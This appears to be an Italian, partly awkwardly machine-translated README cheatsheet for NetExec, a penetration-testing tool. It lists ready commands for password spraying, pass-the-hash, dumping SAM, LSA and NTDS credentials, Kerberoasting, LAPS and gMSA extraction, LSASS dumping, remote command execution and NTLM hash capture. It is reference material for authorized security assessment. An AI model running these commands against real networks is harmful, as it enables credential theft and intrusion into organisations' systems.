<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚡ NetExec (nxc) - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```
<palign="centro">
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="Successore ECM">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multiprotocollo">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Network Pentesting">
</p>

<palign="centro">
  <b>🌐 Il successore ufficiale di CrackMapExec, gestito dalla comunità, per lo sfruttamento della rete e di Active Directory</b>
</p>

---

## 📋 Sommario

- [Introduzione](#-introduzione)
- [Perché NetExec invece di CrackMapExec?](#-perché-netexec-over-crackmapexec)
- [Installazione](#-installazione)
- [Protocolli supportati](#-protocolli-supportati)
- [Sfruttamento PMI](#-smb-sfruttamento)
  - [Enumerazione ricognizione e condivisione](#ricognizione--enumerazione-condivisione)
  - [Spray password e test credenziali](#spray-password--test-credenziali)
  - [Passa l'hash (PtH) e Passa il biglietto (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
  - [Dumping delle credenziali (SAM, LSA, NTDS)](#credential-dumping-sam-lsa-ntds)
  - [Esecuzione del comando](#esecuzione-comando)
- [Sfruttamento LDAP](#-ldap-sfruttamento)
  - [Enumerazione domini e policy password](#enumerazione-dominio--policy-password)
  - [Torrefazione AS-REP e Kerberoasting](#as-rep-roasting--kerberoasting)
  - [LAPS & gMSA Extraction](#laps--gmsa-extraction)
  - [Ingestione dati Bloodhound](#bloodhound-data-ingestion)
- [Sfruttamento MSSQL](#-mssql-sfruttamento)
- [Moduli WinRM, RDP e SSH](#-winrm-rdp--ssh-modules)
- [Moduli NetExec popolari (`-M`)](#-popular-netexec-modules--m)
- [Aree di lavoro e database integrato](#-workspaces--built-in-database)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Suggerimenti e best practice](#-tips--best-practice)
- [Disclaimer legale](#-legal-disclaimer)
- [Risorse](#-risorse)

---

## 🎯 Introduzione

**NetExec** (`nxc`) è uno strumento post-exploitation multiuso progettato per automatizzare la valutazione di reti Active Directory e Windows di grandi dimensioni. È il fork ufficiale e attivo della comunità e la continuazione di **CrackMapExec** (CME), creato dopo che CME è stato ritirato e archiviato dal suo autore originale.

NetExec funge da "coltellino svizzero" di rete, interfacciandosi perfettamente con SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP e VNC per automatizzare l'autenticazione, il dumping delle credenziali, i controlli di vulnerabilità e il movimento laterale.

---

## ⚖️ Perché NetExec invece di CrackMapExec?

| Caratteristica | CrackMapExec (CME) | NetExec (nxc) |
|---------|--------------------|------|
| **Stato di sviluppo** | 🛑 Archiviato/deprecato | 🟢 Mantenuto attivamente |
| **Supporto Python** | Eredità (Python 3.8-3.10) | Python moderno 3.10+ |
| **Supporto protocollo** | SMB, LDAP, MSSQL, WinRM, SSH | + Miglioramenti VNC, FTP, RDP, WMI |
| **Supporto per BloodHound** | Solo BloodHound Legacy | BloodHound CE e Legacy |
| **Kerberos e PKINIT** | Limitato | Robusto supporto per ticket PKINIT e Kerberos |
| **Correzioni di bug e moduli** | Congelato | Moduli CVE e exploit costantemente aggiornati |

---

## 📥Installazione

### Utilizzo di pipx (consigliato)
```bash
pipx install netexec
```
### Kali Linux

NetExec è il sostituto ufficiale di CrackMapExec in Kali:
```bash
sudo apt update && sudo apt install -y netexec
```
### Finestra mobile
```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```
### Verifica
```bash
nxc --version
```
---

## 🔌 Protocolli supportati

NetExec accetta il protocollo di destinazione come argomento principale:
```bash
nxc <protocol> <target(s)> [options]
```
- `nxc smb` - Blocco messaggi server (condivisioni, dumping SAM/LSA/NTDS, comando exec)
- `nxc ldap` - Protocollo di accesso alla directory leggero (Kerberoasting, BloodHound, LAPS)
- `nxc mssql` - Microsoft SQL Server (query sul database, xp_cmdshell, rappresentazione)
- `nxc winrm` - Gestione remota Windows (esecuzione furtiva dei comandi)
- `nxc rdp` - Protocollo Desktop remoto (verifica autenticazione, screenshot)
- `nxc ssh` - Secure Shell (test ed esecuzione delle credenziali Linux/UNIX)
- `nxc ftp` / `nxc vnc` - Trasferimento file e elaborazione di rete virtuale

---

## 🛡️ Sfruttamento delle PMI

### Enumerazione di ricognizione e condivisione
```bash
# Discover live hosts and check SMB signing status
nxc smb 10.10.10.0/24

# Enumerate null/anonymous sessions
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Enumerate readable shares with credentials
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Spider shares for sensitive files (e.g., matching config, password, or bak)
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```
### Applicazione di password e test delle credenziali
```bash
# Check domain password policy before spraying (Prevents account lockouts!)
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Password spray a single password against a list of users
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Credential stuffing with user:pass pairs
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```
### Passa l'hash (PtH) e passa il biglietto (PtT)
```bash
# Authenticate using NTLM hash
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Authenticate using Kerberos ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```
### Dumping delle credenziali (SAM, LSA, NTDS)
```bash
# Dump local SAM database (Requires administrative privileges)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# Dump LSA secrets (Service accounts, cleartext passwords)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Dump Active Directory NTDS.dit database via VSS on Domain Controller
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```
### Esecuzione del comando
```bash
# Execute command via WMI (default)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# Execute command via PowerShell
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# Execute command via SMBexec or atexec
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```
---

## 🌳 Sfruttamento LDAP

### Enumerazione dei domini e politica della password
```bash
# Dump domain users
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Dump domain groups and memberships
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Check for active domain computers
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```
### Arrostimento AS-REP e Kerberoasting
```bash
# Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Request Kerberos Service Tickets (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```
### Estrazione GIRI e gMSA
```bash
# Extract Microsoft LAPS (Local Administrator Password Solution) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Dump Group Managed Service Account (gMSA) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```
### Ingestione dati BloodHound
```bash
# Collect BloodHound data natively over LDAP
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```
---

## 🗄️ Sfruttamento di MSSQL
```bash
# Test MSSQL authentication across network
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Check for privilege escalation via server links
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# Enable xp_cmdshell and execute operating system command
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# Capture NetNTLMv2 hash by triggering xp_dirtree
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```
---

## 🚀 Moduli WinRM, RDP e SSH

### Esecuzione del comando WinRM
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```
### Screenshot e autenticazione RDP
```bash
# Check RDP credentials and capture login screenshot
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```
### Spruzzatura e comandi SSH
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```
---

## 🧩 Moduli NetExec popolari (`-M`)

| Modulo | Protocollo | Descrizione | Esempio |
|--------|----------|-------------|---------|
| `spooler` | PMI | Controlla se il servizio Spooler di stampa è in esecuzione (PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` | PMI | Verifica la vulnerabilità CVE-2020-1472 | `nxc smb <IP> -M zerologon` |
| `nopac` | PMI | Verifica CVE-2021-42278 / CVE-2021-42287 | `nxc smb <IP> -M nopac` |
| `petitpotam` | PMI | Controlla se l'host è vulnerabile alla coercizione di PetitPotam | `nxc smb <IP> -M petitpotam` |
| `nanodump` | PMI | Scarica di nascosto il minidump della memoria LSASS utilizzando nanodump | `nxc smb <IP> -u admin -p pass -M nanodump` |
| `webdav` | PMI | Controlla se il servizio WebClient è attivo per il relè WebDAV | `nxc smb <IP> -M webdav` |
| `laps` | LDAP | Scarica le password LAPS per le workstation | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa` | LDAP | Estrai i segreti dell'account del servizio gestito del gruppo | `nxc ldap <IP> -u u -p p -M gmsa` |

---

## 💾 Aree di lavoro e database integrato

NetExec registra automaticamente tutti gli host rilevati, le credenziali valide e gli hash scaricati in un database SQLite locale (`~/.nxc/workspaces/`):
```bash
# View all stored credentials
nxc-database credentials

# View discovered hosts
nxc-database hosts

# Create and switch to a new client engagement workspace
nxc-database workspace create ClientAlpha
nxc-database workspace switch ClientAlpha
```
---

## 📊 Tabella di consultazione rapida

| Compito | Protocollo | Comando |
|------|----------|---------|
| **Elencare le azioni** | PMI | `nxc smb <IP> -u '' -p '' --shares` |
| **Verifica la politica del pass** | PMI | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **Spray password** | PMI | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **Passa l'hash** | PMI | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| **Scarica SAM** | PMI | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **Scarica NTDS** | PMI | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| **Torrefazione AS-REP** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **Kerberoasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **Discarica di BloodHound** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell**| MS SQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 Suggerimenti e migliori pratiche

1. **Controlla sempre prima la politica sulla password:**
   Prima di lanciare qualsiasi spray per password, esegui sempre `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` per ispezionare `Account Lockout Threshold`. Se è impostato su 3 o 5, spruzza solo una volta ogni 30+ minuti per evitare di bloccare gli account di dominio.
2. **Utilizza `--local-auth` per workstation:**
   Quando si testano le credenziali di amministratore locale su workstation anziché le credenziali di dominio, includere sempre il flag `--local-auth`.
3. **Integrazione pivot:**
   NetExec funziona perfettamente sui proxy SOCKS (ad esempio `proxychains nxc smb ...`) o sulle interfacce TUN Ligolo-ng con velocità nativa!

---

## ⚠️ Disclaimer legale

> **IMPORTANTE:** NetExec è uno strumento offensivo di valutazione della sicurezza. Il suo utilizzo deve essere tassativamente effettuato su reti informatiche e infrastrutture di dominio dove sia stata acquisita esplicita e documentata autorizzazione.

---

## 📚 Risorse

- [Repository GitHub ufficiale NetExec](https://github.com/Pennyw0rth/NetExec)
- [Documentazione ufficiale NetExec](https://www.netexec.wiki/)